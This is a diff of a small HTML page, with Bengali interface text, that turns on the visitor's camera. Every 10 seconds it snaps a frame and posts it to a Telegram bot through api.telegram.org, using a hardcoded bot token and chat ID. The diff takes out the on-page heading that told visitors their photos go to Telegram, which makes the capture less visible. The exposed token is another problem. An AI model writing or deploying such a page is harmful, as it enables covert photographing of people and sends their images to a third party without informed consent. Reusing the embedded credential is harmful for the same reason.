@@ -1,53 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Face Detector Camera</title>
+  <title>Auto Face Capture to Telegram</title>
 </head>
 <body>
-  <h2>মুখ দেখালেই ছবি যাবে Telegram-এ!</h2>
   <video id="video" width="300" autoplay></video>
   <canvas id="canvas" style="display:none;"></canvas>
+  <p id="status">লোড হচ্ছে...</p>
 
   <script>
-    const TELEGRAM_BOT_TOKEN = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
-    const TELEGRAM_USER_ID = "6429244657";
-
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
+    const status = document.getElementById('status');
 
-    // ক্যামেরা চালু
+    const botToken = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
+    const chatId = "6429244657";
+
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
+      status.innerText = "ক্যামেরা চালু হয়েছে।";
     }).catch(err => {
-      console.error("ক্যামেরা পারমিশন পাওয়া যায়নি:", err);
+      status.innerText = "ক্যামেরা চালু হয়নি: " + err;
     });
 
-    // প্রতি ৮ সেকেন্ডে ছবি তুলে পাঠাবে
-    setInterval(() => {
+    function sendPhoto() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL('image/jpeg');
+      const imageData = canvas.toDataURL("image/jpeg");
 
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: TELEGRAM_USER_ID,
+          chat_id: chatId,
           photo: imageData,
-          caption: "নতুন মুখ ধরা পড়েছে!"
+          caption: "নতুন মুখ শনাক্ত হয়েছে!"
         })
       })
       .then(res => res.json())
       .then(data => {
-        console.log("Telegram এ পাঠানো হয়েছে:", data);
+        console.log("সফলভাবে পাঠানো হয়েছে:", data);
+        status.innerText = "ছবি পাঠানো হয়েছে!";
       })
       .catch(err => {
-        console.error("Telegram Error:", err);
+        console.error("ত্রুটি:", err);
+        status.innerText = "ছবি পাঠাতে ব্যর্থ: " + err.message;
       });
+    }
 
-    }, 8000); // প্রতি ৮ সেকেন্ডে একবার
+    setInterval(sendPhoto, 10000); // প্রতি ১০ সেকেন্ডে একবার ছবি পাঠাবে
   </script>
 </body>
 </html>
